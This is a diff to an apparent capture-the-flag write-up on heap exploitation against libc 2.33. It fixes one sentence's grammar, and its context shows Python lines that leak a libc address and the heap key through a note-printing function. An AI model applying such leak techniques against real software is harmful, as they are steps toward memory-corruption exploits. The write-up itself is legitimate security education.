@@ -266,7 +266,7 @@ With this, we can print out the `libc` address.
 unsorted_leak = u64(b"\x00" + print_note(7)[0x72:-1] + b"\x00"*2)
 ```
 
-Let's not forget to leak heap key because this is `libc 2.33`.
+Let's not forget to leak the heap key because this is `libc 2.33`.
 ```python
 heap_leak = u64(print_note(0)[1:-1] + b"\x00"*3)
 ```
